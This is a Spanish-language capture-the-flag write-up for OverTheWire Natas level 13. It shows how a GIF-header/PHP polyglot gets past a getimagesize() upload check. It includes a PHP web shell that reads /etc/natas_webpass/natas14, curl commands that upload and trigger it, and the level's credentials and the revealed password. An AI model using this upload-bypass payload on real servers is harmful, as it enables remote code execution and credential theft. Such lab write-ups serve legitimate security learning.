# Natas Level13

## Descripción
> **Level Goal (natas13.natas.labs.overthewire.org):** Igual que el nivel 12, pero ahora "por razones de seguridad, solo aceptamos archivos de imagen" — el servidor valida el contenido subido con `getimagesize()`.

## Solución
`getimagesize()` solo comprueba que el archivo *empiece* con una cabecera válida de un formato de imagen conocido (GIF, PNG, JPEG, etc.); no impide que el resto del archivo contenga código PHP. Basta con anteponer una cabecera GIF válida (`GIF89a;`) al mismo payload PHP del nivel anterior — un "polyglot" válido como imagen y como script PHP a la vez.

```bash
printf 'GIF89a;\n<?php passthru("cat /etc/natas_webpass/natas14"); ?>' > shell13.php

curl -s -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \
  -F "filename=shell.php" \
  -F "MAX_FILE_SIZE=1000" \
  -F "uploadedfile=@shell13.php" \
  http://natas13.natas.labs.overthewire.org/index.php
# The file <a href="upload/rronf89ol9.php">upload/rronf89ol9.php</a> has been uploaded

curl -s -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \
  http://natas13.natas.labs.overthewire.org/upload/rronf89ol9.php
# GIF89a;
# A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
```

## Notas adicionales
- El PHP se ejecuta igual aunque el archivo empiece con bytes que no son código: el intérprete de PHP busca las etiquetas `<?php ... ?>` en cualquier parte del archivo y ejecuta solo eso, imprimiendo el resto (la cabecera GIF) como texto plano.
- Validar el "tipo" de un archivo subido por su cabecera de magic bytes es necesario pero no suficiente; además hay que evitar que el servidor web ejecute como código lo que se sube (p. ej. subiendo a un directorio sin permiso de ejecución de PHP, o forzando una extensión fija).

## Referencias
- Reto original: http://natas13.natas.labs.overthewire.org/
- Apoyo: https://www.php.net/manual/en/function.getimagesize.php (manual de PHP, `getimagesize()` solo valida cabecera)
